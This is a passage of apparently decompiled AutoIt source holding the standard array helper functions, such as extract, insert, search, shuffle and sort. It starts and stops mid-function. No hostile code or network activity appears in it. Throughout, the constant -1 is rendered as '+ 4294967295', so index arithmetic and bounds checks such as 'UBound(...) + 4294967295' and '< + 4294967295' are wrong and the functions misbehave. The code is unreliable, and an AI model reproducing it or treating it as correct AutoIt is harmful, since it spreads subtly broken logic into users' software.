			GUICtrlSetState ( $IDLISTVIEW , $_ARRAYCONSTANT_GUI_FOCUS )
		Case $IDEXIT_SCRIPT
			GUIDelete ( $HGUI )
			Exit
		EndSwitch
	WEnd
	GUIDelete ( $HGUI )
	Opt ( "GUICoordMode" , $ICOORDMODE )
	Opt ( "GUIOnEventMode" , $IONEVENTMODE )
	Opt ( "GUIDataSeparatorChar" , $SCURR_SEPARATOR )
	Return 1
EndFunc
Func _ARRAYEXTRACT ( Const ByRef $AARRAY , $ISTART_ROW = + 4294967295 , $IEND_ROW = + 4294967295 , $ISTART_COL = + 4294967295 , $IEND_COL = + 4294967295 )
	If $ISTART_ROW = Default Then $ISTART_ROW = + 4294967295
	If $IEND_ROW = Default Then $IEND_ROW = + 4294967295
	If $ISTART_COL = Default Then $ISTART_COL = + 4294967295
	If $IEND_COL = Default Then $IEND_COL = + 4294967295
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	If $IEND_ROW = + 4294967295 Then $IEND_ROW = $IDIM_1
	If $ISTART_ROW = + 4294967295 Then $ISTART_ROW = 0
	If $ISTART_ROW < + 4294967295 Or $IEND_ROW < + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART_ROW > $IDIM_1 Or $IEND_ROW > $IDIM_1 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART_ROW > $IEND_ROW Then Return SetError ( 4 , 0 , + 4294967295 )
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		Local $ARETARRAY [ $IEND_ROW - $ISTART_ROW + 1 ]
		For $I = 0 To $IEND_ROW - $ISTART_ROW
			$ARETARRAY [ $I ] = $AARRAY [ $I + $ISTART_ROW ]
		Next
		Return $ARETARRAY
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $IEND_COL = + 4294967295 Then $IEND_COL = $IDIM_2
		If $ISTART_COL = + 4294967295 Then $ISTART_COL = 0
		If $ISTART_COL < + 4294967295 Or $IEND_COL < + 4294967295 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $ISTART_COL > $IDIM_2 Or $IEND_COL > $IDIM_2 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $ISTART_COL > $IEND_COL Then Return SetError ( 6 , 0 , + 4294967295 )
		If $ISTART_COL = $IEND_COL Then
			Local $ARETARRAY [ $IEND_ROW - $ISTART_ROW + 1 ]
		Else
			Local $ARETARRAY [ $IEND_ROW - $ISTART_ROW + 1 ] [ $IEND_COL - $ISTART_COL + 1 ]
		EndIf
		For $I = 0 To $IEND_ROW - $ISTART_ROW
			For $J = 0 To $IEND_COL - $ISTART_COL
				If $ISTART_COL = $IEND_COL Then
					$ARETARRAY [ $I ] = $AARRAY [ $I + $ISTART_ROW ] [ $J + $ISTART_COL ]
				Else
					$ARETARRAY [ $I ] [ $J ] = $AARRAY [ $I + $ISTART_ROW ] [ $J + $ISTART_COL ]
				EndIf
			Next
		Next
		Return $ARETARRAY
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return 1
EndFunc
Func _ARRAYFINDALL ( Const ByRef $AARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 , $ICASE = 0 , $ICOMPARE = 0 , $ISUBITEM = 0 , $BROW = False )
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ICASE = Default Then $ICASE = 0
	If $ICOMPARE = Default Then $ICOMPARE = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	If $BROW = Default Then $BROW = False
	$ISTART = _ARRAYSEARCH ( $AARRAY , $VVALUE , $ISTART , $IEND , $ICASE , $ICOMPARE , 1 , $ISUBITEM , $BROW )
	If @error Then Return SetError ( @error , 0 , + 4294967295 )
	Local $IINDEX = 0 , $AVRESULT [ UBound ( $AARRAY , ( $BROW ? $UBOUND_COLUMNS : $UBOUND_ROWS ) ) ]
	Do
		$AVRESULT [ $IINDEX ] = $ISTART
		$IINDEX += 1
		$ISTART = _ARRAYSEARCH ( $AARRAY , $VVALUE , $ISTART + 1 , $IEND , $ICASE , $ICOMPARE , 1 , $ISUBITEM , $BROW )
	Until @error
	ReDim $AVRESULT [ $IINDEX ]
	Return $AVRESULT
EndFunc
Func _ARRAYINSERT ( ByRef $AARRAY , $VRANGE , $VVALUE = "" , $ISTART = 0 , $SDELIM_ITEM = "|" , $SDELIM_ROW = @CRLF , $IFORCE = $ARRAYFILL_FORCE_DEFAULT )
	If $VVALUE = Default Then $VVALUE = ""
	If $ISTART = Default Then $ISTART = 0
	If $SDELIM_ITEM = Default Then $SDELIM_ITEM = "|"
	If $SDELIM_ROW = Default Then $SDELIM_ROW = @CRLF
	If $IFORCE = Default Then $IFORCE = $ARRAYFILL_FORCE_DEFAULT
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
	Local $HDATATYPE = 0
	Switch $IFORCE
	Case $ARRAYFILL_FORCE_INT
		$HDATATYPE = Int
	Case $ARRAYFILL_FORCE_NUMBER
		$HDATATYPE = Number
	Case $ARRAYFILL_FORCE_PTR
		$HDATATYPE = Ptr
	Case $ARRAYFILL_FORCE_HWND
		$HDATATYPE = HWnd
	Case $ARRAYFILL_FORCE_STRING
		$HDATATYPE = String
	EndSwitch
	Local $ASPLIT_1 , $ASPLIT_2
	If IsArray ( $VRANGE ) Then
		If UBound ( $VRANGE , $UBOUND_DIMENSIONS ) <> 1 Or UBound ( $VRANGE , $UBOUND_ROWS ) < 2 Then Return SetError ( 4 , 0 , + 4294967295 )
	Else
		Local $INUMBER
		$VRANGE = StringStripWS ( $VRANGE , 8 )
		$ASPLIT_1 = StringSplit ( $VRANGE , ";" )
		$VRANGE = ""
		For $I = 1 To $ASPLIT_1 [ 0 ]
			If Not StringRegExp ( $ASPLIT_1 [ $I ] , "^\d+(-\d+)?$" ) Then Return SetError ( 3 , 0 , + 4294967295 )
			$ASPLIT_2 = StringSplit ( $ASPLIT_1 [ $I ] , "-" )
			Switch $ASPLIT_2 [ 0 ]
			Case 1
				$VRANGE &= $ASPLIT_2 [ 1 ] & ";"
			Case 2
				If Number ( $ASPLIT_2 [ 2 ] ) >= Number ( $ASPLIT_2 [ 1 ] ) Then
					$INUMBER = $ASPLIT_2 [ 1 ] + 4294967295
					Do
						$INUMBER += 1
						$VRANGE &= $INUMBER & ";"
					Until $INUMBER = $ASPLIT_2 [ 2 ]
				EndIf
			EndSwitch
		Next
		$VRANGE = StringSplit ( StringTrimRight ( $VRANGE , 1 ) , ";" )
	EndIf
	If $VRANGE [ 1 ] < 0 Or $VRANGE [ $VRANGE [ 0 ] ] > $IDIM_1 Then Return SetError ( 5 , 0 , + 4294967295 )
	For $I = 2 To $VRANGE [ 0 ]
		If $VRANGE [ $I ] < $VRANGE [ $I + 4294967295 ] Then Return SetError ( 3 , 0 , + 4294967295 )
	Next
	Local $ICOPYTO_INDEX = $IDIM_1 + $VRANGE [ 0 ]
	Local $IINSERTPOINT_INDEX = $VRANGE [ 0 ]
	Local $IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $IFORCE = $ARRAYFILL_FORCE_SINGLEITEM Then
			ReDim $AARRAY [ $IDIM_1 + $VRANGE [ 0 ] + 1 ]
			For $IREADFROMINDEX = $IDIM_1 To 0 Step + 4294967295
				$AARRAY [ $ICOPYTO_INDEX ] = $AARRAY [ $IREADFROMINDEX ]
				$ICOPYTO_INDEX -= 1
				$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
				While $IREADFROMINDEX = $IINSERT_INDEX
					$AARRAY [ $ICOPYTO_INDEX ] = $VVALUE
					$ICOPYTO_INDEX -= 1
					$IINSERTPOINT_INDEX -= 1
					If $IINSERTPOINT_INDEX < 1 Then ExitLoop 2
					$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
				WEnd
			Next
			Return $IDIM_1 + $VRANGE [ 0 ] + 1
		EndIf
		ReDim $AARRAY [ $IDIM_1 + $VRANGE [ 0 ] + 1 ]
		If IsArray ( $VVALUE ) Then
			If UBound ( $VVALUE , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 5 , 0 , + 4294967295 )
			$HDATATYPE = 0
		Else
			Local $ATMP = StringSplit ( $VVALUE , $SDELIM_ITEM , $STR_NOCOUNT + $STR_ENTIRESPLIT )
			If UBound ( $ATMP , $UBOUND_ROWS ) = 1 Then
				$ATMP [ 0 ] = $VVALUE
				$HDATATYPE = 0
			EndIf
			$VVALUE = $ATMP
		EndIf
		For $IREADFROMINDEX = $IDIM_1 To 0 Step + 4294967295
			$AARRAY [ $ICOPYTO_INDEX ] = $AARRAY [ $IREADFROMINDEX ]
			$ICOPYTO_INDEX -= 1
			$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
			While $IREADFROMINDEX = $IINSERT_INDEX
				If $IINSERTPOINT_INDEX <= UBound ( $VVALUE , $UBOUND_ROWS ) Then
					If IsFunc ( $HDATATYPE ) Then
						$AARRAY [ $ICOPYTO_INDEX ] = $HDATATYPE ( $VVALUE [ $IINSERTPOINT_INDEX + 4294967295 ] )
					Else
						$AARRAY [ $ICOPYTO_INDEX ] = $VVALUE [ $IINSERTPOINT_INDEX + 4294967295 ]
					EndIf
				Else
					$AARRAY [ $ICOPYTO_INDEX ] = ""
				EndIf
				$ICOPYTO_INDEX -= 1
				$IINSERTPOINT_INDEX -= 1
				If $IINSERTPOINT_INDEX = 0 Then ExitLoop 2
				$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
			WEnd
		Next
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $ISTART < 0 Or $ISTART > $IDIM_2 + 4294967295 Then Return SetError ( 6 , 0 , + 4294967295 )
		Local $IVALDIM_1 , $IVALDIM_2
		If IsArray ( $VVALUE ) Then
			If UBound ( $VVALUE , $UBOUND_DIMENSIONS ) <> 2 Then Return SetError ( 7 , 0 , + 4294967295 )
			$IVALDIM_1 = UBound ( $VVALUE , $UBOUND_ROWS )
			$IVALDIM_2 = UBound ( $VVALUE , $UBOUND_COLUMNS )
			$HDATATYPE = 0
		Else
			$ASPLIT_1 = StringSplit ( $VVALUE , $SDELIM_ROW , $STR_NOCOUNT + $STR_ENTIRESPLIT )
			$IVALDIM_1 = UBound ( $ASPLIT_1 , $UBOUND_ROWS )
			StringReplace ( $ASPLIT_1 [ 0 ] , $SDELIM_ITEM , "" )
			$IVALDIM_2 = @extended + 1
			Local $ATMP [ $IVALDIM_1 ] [ $IVALDIM_2 ]
			For $I = 0 To $IVALDIM_1 + 4294967295
				$ASPLIT_2 = StringSplit ( $ASPLIT_1 [ $I ] , $SDELIM_ITEM , $STR_NOCOUNT + $STR_ENTIRESPLIT )
				For $J = 0 To $IVALDIM_2 + 4294967295
					$ATMP [ $I ] [ $J ] = $ASPLIT_2 [ $J ]
				Next
			Next
			$VVALUE = $ATMP
		EndIf
		If UBound ( $VVALUE , $UBOUND_COLUMNS ) + $ISTART > UBound ( $AARRAY , $UBOUND_COLUMNS ) Then Return SetError ( 8 , 0 , + 4294967295 )
		ReDim $AARRAY [ $IDIM_1 + $VRANGE [ 0 ] + 1 ] [ $IDIM_2 ]
		For $IREADFROMINDEX = $IDIM_1 To 0 Step + 4294967295
			For $J = 0 To $IDIM_2 + 4294967295
				$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = $AARRAY [ $IREADFROMINDEX ] [ $J ]
			Next
			$ICOPYTO_INDEX -= 1
			$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
			While $IREADFROMINDEX = $IINSERT_INDEX
				For $J = 0 To $IDIM_2 + 4294967295
					If $J < $ISTART Then
						$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = ""
					ElseIf $J - $ISTART > $IVALDIM_2 + 4294967295 Then
						$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = ""
					Else
						If $IINSERTPOINT_INDEX + 4294967295 < $IVALDIM_1 Then
							If IsFunc ( $HDATATYPE ) Then
								$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = $HDATATYPE ( $VVALUE [ $IINSERTPOINT_INDEX + 4294967295 ] [ $J - $ISTART ] )
							Else
								$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = $VVALUE [ $IINSERTPOINT_INDEX + 4294967295 ] [ $J - $ISTART ]
							EndIf
						Else
							$AARRAY [ $ICOPYTO_INDEX ] [ $J ] = ""
						EndIf
					EndIf
				Next
				$ICOPYTO_INDEX -= 1
				$IINSERTPOINT_INDEX -= 1
				If $IINSERTPOINT_INDEX = 0 Then ExitLoop 2
				$IINSERT_INDEX = $VRANGE [ $IINSERTPOINT_INDEX ]
			WEnd
		Next
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_ROWS )
EndFunc
Func _ARRAYMAX ( Const ByRef $AARRAY , $ICOMPNUMERIC = 0 , $ISTART = + 4294967295 , $IEND = + 4294967295 , $ISUBITEM = 0 )
	Local $IRESULT = _ARRAYMAXINDEX ( $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM )
	If @error Then Return SetError ( @error , 0 , "" )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) = 1 Then
		Return $AARRAY [ $IRESULT ]
	Else
		Return $AARRAY [ $IRESULT ] [ $ISUBITEM ]
	EndIf
EndFunc
Func _ARRAYMAXINDEX ( Const ByRef $AARRAY , $ICOMPNUMERIC = 0 , $ISTART = + 4294967295 , $IEND = + 4294967295 , $ISUBITEM = 0 )
	If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0
	If $ISTART = Default Then $ISTART = + 4294967295
	If $IEND = Default Then $IEND = + 4294967295
	If $ISUBITEM = Default Then $ISUBITEM = 0
	Local $IRET = __ARRAY_MINMAXINDEX ( $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM , __ARRAY_GREATERTHAN )
	Return SetError ( @error , 0 , $IRET )
EndFunc
Func _ARRAYMIN ( Const ByRef $AARRAY , $ICOMPNUMERIC = 0 , $ISTART = + 4294967295 , $IEND = + 4294967295 , $ISUBITEM = 0 )
	Local $IRESULT = _ARRAYMININDEX ( $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM )
	If @error Then Return SetError ( @error , 0 , "" )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) = 1 Then
		Return $AARRAY [ $IRESULT ]
	Else
		Return $AARRAY [ $IRESULT ] [ $ISUBITEM ]
	EndIf
EndFunc
Func _ARRAYMININDEX ( Const ByRef $AARRAY , $ICOMPNUMERIC = 0 , $ISTART = + 4294967295 , $IEND = + 4294967295 , $ISUBITEM = 0 )
	If $ICOMPNUMERIC = Default Then $ICOMPNUMERIC = 0
	If $ISTART = Default Then $ISTART = + 4294967295
	If $IEND = Default Then $IEND = + 4294967295
	If $ISUBITEM = Default Then $ISUBITEM = 0
	Local $IRET = __ARRAY_MINMAXINDEX ( $AARRAY , $ICOMPNUMERIC , $ISTART , $IEND , $ISUBITEM , __ARRAY_LESSTHAN )
	Return SetError ( @error , 0 , $IRET )
EndFunc
Func _ARRAYPERMUTE ( ByRef $AARRAY , $SDELIMITER = "" )
	If $SDELIMITER = Default Then $SDELIMITER = ""
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 2 , 0 , 0 )
	Local $ISIZE = UBound ( $AARRAY ) , $IFACTORIAL = 1 , $AIDX [ $ISIZE ] , $ARESULT [ 1 ] , $ICOUNT = 1
	If UBound ( $AARRAY ) Then
		For $I = 0 To $ISIZE + 4294967295
			$AIDX [ $I ] = $I
		Next
		For $I = $ISIZE To 1 Step + 4294967295
			$IFACTORIAL *= $I
		Next
		ReDim $ARESULT [ $IFACTORIAL + 1 ]
		$ARESULT [ 0 ] = $IFACTORIAL
		__ARRAY_EXETERINTERNAL ( $AARRAY , 0 , $ISIZE , $SDELIMITER , $AIDX , $ARESULT , $ICOUNT )
	Else
		$ARESULT [ 0 ] = 0
	EndIf
	Return $ARESULT
EndFunc
Func _ARRAYPOP ( ByRef $AARRAY )
	If ( Not IsArray ( $AARRAY ) ) Then Return SetError ( 1 , 0 , "" )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 2 , 0 , "" )
	Local $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If $IUBOUND = + 4294967295 Then Return SetError ( 3 , 0 , "" )
	Local $SLASTVAL = $AARRAY [ $IUBOUND ]
	If $IUBOUND > + 4294967295 Then
		ReDim $AARRAY [ $IUBOUND ]
	EndIf
	Return $SLASTVAL
EndFunc
Func _ARRAYPUSH ( ByRef $AARRAY , $VVALUE , $IDIRECTION = 0 )
	If $IDIRECTION = Default Then $IDIRECTION = 0
	If ( Not IsArray ( $AARRAY ) ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 3 , 0 , 0 )
	Local $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If IsArray ( $VVALUE ) Then
		Local $IUBOUNDS = UBound ( $VVALUE )
		If ( $IUBOUNDS + 4294967295 ) > $IUBOUND Then Return SetError ( 2 , 0 , 0 )
		If $IDIRECTION Then
			For $I = $IUBOUND To $IUBOUNDS Step + 4294967295
				$AARRAY [ $I ] = $AARRAY [ $I - $IUBOUNDS ]
			Next
			For $I = 0 To $IUBOUNDS + 4294967295
				$AARRAY [ $I ] = $VVALUE [ $I ]
			Next
		Else
			For $I = 0 To $IUBOUND - $IUBOUNDS
				$AARRAY [ $I ] = $AARRAY [ $I + $IUBOUNDS ]
			Next
			For $I = 0 To $IUBOUNDS + 4294967295
				$AARRAY [ $I + $IUBOUND - $IUBOUNDS + 1 ] = $VVALUE [ $I ]
			Next
		EndIf
	Else
		If $IUBOUND > + 4294967295 Then
			If $IDIRECTION Then
				For $I = $IUBOUND To 1 Step + 4294967295
					$AARRAY [ $I ] = $AARRAY [ $I + 4294967295 ]
				Next
				$AARRAY [ 0 ] = $VVALUE
			Else
				For $I = 0 To $IUBOUND + 4294967295
					$AARRAY [ $I ] = $AARRAY [ $I + 1 ]
				Next
				$AARRAY [ $IUBOUND ] = $VVALUE
			EndIf
		EndIf
	EndIf
	Return 1
EndFunc
Func _ARRAYREVERSE ( ByRef $AARRAY , $ISTART = 0 , $IEND = 0 )
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 3 , 0 , 0 )
	If Not UBound ( $AARRAY ) Then Return SetError ( 4 , 0 , 0 )
	Local $VTMP , $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If $IEND < 1 Or $IEND > $IUBOUND Then $IEND = $IUBOUND
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , 0 )
	For $I = $ISTART To Int ( ( $ISTART + $IEND + 4294967295 ) / 2 )
		$VTMP = $AARRAY [ $I ]
		$AARRAY [ $I ] = $AARRAY [ $IEND ]
		$AARRAY [ $IEND ] = $VTMP
		$IEND -= 1
	Next
	Return 1
EndFunc
Func _ARRAYSEARCH ( Const ByRef $AARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 , $ICASE = 0 , $ICOMPARE = 0 , $IFORWARD = 1 , $ISUBITEM = + 4294967295 , $BROW = False )
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ICASE = Default Then $ICASE = 0
	If $ICOMPARE = Default Then $ICOMPARE = 0
	If $IFORWARD = Default Then $IFORWARD = 1
	If $ISUBITEM = Default Then $ISUBITEM = + 4294967295
	If $BROW = Default Then $BROW = False
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY ) + 4294967295
	If $IDIM_1 = + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
	Local $BCOMPTYPE = False
	If $ICOMPARE = 2 Then
		$ICOMPARE = 0
		$BCOMPTYPE = True
	EndIf
	If $BROW Then
		If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) = 1 Then Return SetError ( 5 , 0 , + 4294967295 )
		If $IEND < 1 Or $IEND > $IDIM_2 Then $IEND = $IDIM_2
		If $ISTART < 0 Then $ISTART = 0
		If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	Else
		If $IEND < 1 Or $IEND > $IDIM_1 Then $IEND = $IDIM_1
		If $ISTART < 0 Then $ISTART = 0
		If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	EndIf
	Local $ISTEP = 1
	If Not $IFORWARD Then
		Local $ITMP = $ISTART
		$ISTART = $IEND
		$IEND = $ITMP
		$ISTEP = + 4294967295
	EndIf
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If Not $ICOMPARE Then
			If Not $ICASE Then
				For $I = $ISTART To $IEND Step $ISTEP
					If $BCOMPTYPE And VarGetType ( $AARRAY [ $I ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
					If $AARRAY [ $I ] = $VVALUE Then Return $I
				Next
			Else
				For $I = $ISTART To $IEND Step $ISTEP
					If $BCOMPTYPE And VarGetType ( $AARRAY [ $I ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
					If $AARRAY [ $I ] == $VVALUE Then Return $I
				Next
			EndIf
		Else
			For $I = $ISTART To $IEND Step $ISTEP
				If $ICOMPARE = 3 Then
					If StringRegExp ( $AARRAY [ $I ] , $VVALUE ) Then Return $I
				Else
					If StringInStr ( $AARRAY [ $I ] , $VVALUE , $ICASE ) > 0 Then Return $I
				EndIf
			Next
		EndIf
	Case 2
		Local $IDIM_SUB
		If $BROW Then
			$IDIM_SUB = $IDIM_1
			If $ISUBITEM > $IDIM_SUB Then $ISUBITEM = $IDIM_SUB
			If $ISUBITEM < 0 Then
				$ISUBITEM = 0
			Else
				$IDIM_SUB = $ISUBITEM
			EndIf
		Else
			$IDIM_SUB = $IDIM_2
			If $ISUBITEM > $IDIM_SUB Then $ISUBITEM = $IDIM_SUB
			If $ISUBITEM < 0 Then
				$ISUBITEM = 0
			Else
				$IDIM_SUB = $ISUBITEM
			EndIf
		EndIf
		For $J = $ISUBITEM To $IDIM_SUB
			If Not $ICOMPARE Then
				If Not $ICASE Then
					For $I = $ISTART To $IEND Step $ISTEP
						If $BROW Then
							If $BCOMPTYPE And VarGetType ( $AARRAY [ $J ] [ $J ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
							If $AARRAY [ $J ] [ $I ] = $VVALUE Then Return $I
						Else
							If $BCOMPTYPE And VarGetType ( $AARRAY [ $I ] [ $J ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
							If $AARRAY [ $I ] [ $J ] = $VVALUE Then Return $I
						EndIf
					Next
				Else
					For $I = $ISTART To $IEND Step $ISTEP
						If $BROW Then
							If $BCOMPTYPE And VarGetType ( $AARRAY [ $J ] [ $I ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
							If $AARRAY [ $J ] [ $I ] == $VVALUE Then Return $I
						Else
							If $BCOMPTYPE And VarGetType ( $AARRAY [ $I ] [ $J ] ) <> VarGetType ( $VVALUE ) Then ContinueLoop
							If $AARRAY [ $I ] [ $J ] == $VVALUE Then Return $I
						EndIf
					Next
				EndIf
			Else
				For $I = $ISTART To $IEND Step $ISTEP
					If $ICOMPARE = 3 Then
						If $BROW Then
							If StringRegExp ( $AARRAY [ $J ] [ $I ] , $VVALUE ) Then Return $I
						Else
							If StringRegExp ( $AARRAY [ $I ] [ $J ] , $VVALUE ) Then Return $I
						EndIf
					Else
						If $BROW Then
							If StringInStr ( $AARRAY [ $J ] [ $I ] , $VVALUE , $ICASE ) > 0 Then Return $I
						Else
							If StringInStr ( $AARRAY [ $I ] [ $J ] , $VVALUE , $ICASE ) > 0 Then Return $I
						EndIf
					EndIf
				Next
			EndIf
		Next
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return SetError ( 6 , 0 , + 4294967295 )
EndFunc
Func _ARRAYSHUFFLE ( ByRef $AARRAY , $ISTART_ROW = 0 , $IEND_ROW = 0 , $ICOL = + 4294967295 )
	If $ISTART_ROW = Default Then $ISTART_ROW = 0
	If $IEND_ROW = Default Then $IEND_ROW = 0
	If $ICOL = Default Then $ICOL = + 4294967295
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	If $IEND_ROW = 0 Then $IEND_ROW = $IDIM_1 + 4294967295
	If $ISTART_ROW < 0 Or $ISTART_ROW > $IDIM_1 + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $IEND_ROW < 1 Or $IEND_ROW > $IDIM_1 + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
	If $ISTART_ROW > $IEND_ROW Then Return SetError ( 4 , 0 , + 4294967295 )
	Local $VTMP , $IRAND
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		For $I = $IEND_ROW To $ISTART_ROW + 1 Step + 4294967295
			$IRAND = Random ( $ISTART_ROW , $I , 1 )
			$VTMP = $AARRAY [ $I ]
			$AARRAY [ $I ] = $AARRAY [ $IRAND ]
			$AARRAY [ $IRAND ] = $VTMP
		Next
		Return 1
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $ICOL < + 4294967295 Or $ICOL > $IDIM_2 + 4294967295 Then Return SetError ( 5 , 0 , + 4294967295 )
		Local $ICOL_START , $ICOL_END
		If $ICOL = + 4294967295 Then
			$ICOL_START = 0
			$ICOL_END = $IDIM_2 + 4294967295
		Else
			$ICOL_START = $ICOL
			$ICOL_END = $ICOL
		EndIf
		For $I = $IEND_ROW To $ISTART_ROW + 1 Step + 4294967295
			$IRAND = Random ( $ISTART_ROW , $I , 1 )
			For $J = $ICOL_START To $ICOL_END
				$VTMP = $AARRAY [ $I ] [ $J ]
				$AARRAY [ $I ] [ $J ] = $AARRAY [ $IRAND ] [ $J ]
				$AARRAY [ $IRAND ] [ $J ] = $VTMP
			Next
		Next
		Return 1
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
EndFunc
Func _ARRAYSORT ( ByRef $AARRAY , $IDESCENDING = 0 , $ISTART = 0 , $IEND = 0 , $ISUBITEM = 0 , $IPIVOT = 0 )
	If $IDESCENDING = Default Then $IDESCENDING = 0
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	If $IPIVOT = Default Then $IPIVOT = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	Local $IUBOUND = UBound ( $AARRAY ) + 4294967295
	If $IUBOUND = + 4294967295 Then Return SetError ( 5 , 0 , 0 )
	If $IEND = Default Then $IEND = 0
	If $IEND < 1 Or $IEND > $IUBOUND Or $IEND = Default Then $IEND = $IUBOUND
	If $ISTART < 0 Or $ISTART = Default Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 2 , 0 , 0 )
	If $IDESCENDING = Default Then $IDESCENDING = 0
	If $IPIVOT = Default Then $IPIVOT = 0
	If $ISUBITEM = Default Then $ISUBITEM = 0
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $IPIVOT Then
			__ARRAYDUALPIVOTSORT ( $AARRAY , $ISTART , $IEND )
		Else
			__ARRAYQUICKSORT1D ( $AARRAY , $ISTART , $IEND )
		EndIf
		If $IDESCENDING Then _ARRAYREVERSE ( $AARRAY , $ISTART , $IEND )
	Case 2
		If $IPIVOT Then Return SetError ( 6 , 0 , 0 )
		Local $ISUBMAX = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $ISUBITEM > $ISUBMAX Then Return SetError ( 3 , 0 , 0 )
		If $IDESCENDING Then
			$IDESCENDING = + 4294967295
		Else
			$IDESCENDING = 1
		EndIf
		__ARRAYQUICKSORT2D ( $AARRAY , $IDESCENDING , $ISTART , $IEND , $ISUBITEM , $ISUBMAX )
Case Else
		Return SetError ( 4 , 0 , 0 )
	EndSwitch
	Return 1
EndFunc
Func __ARRAYQUICKSORT1D ( ByRef $AARRAY , Const ByRef $ISTART , Const ByRef $IEND )
	If $IEND <= $ISTART Then Return
	Local $VTMP
	If ( $IEND - $ISTART ) < 15 Then
		Local $VCUR
		For $I = $ISTART + 1 To $IEND
			$VTMP = $AARRAY [ $I ]
			If IsNumber ( $VTMP ) Then
				For $J = $I + 4294967295 To $ISTART Step + 4294967295
					$VCUR = $AARRAY [ $J ]
					If ( $VTMP >= $VCUR And IsNumber ( $VCUR ) ) Or ( Not IsNumber ( $VCUR ) And StringCompare ( $VTMP , $VCUR ) >= 0 ) Then ExitLoop
					$AARRAY [ $J + 1 ] = $VCUR
				Next
			Else
				For $J = $I + 4294967295 To $ISTART Step + 4294967295
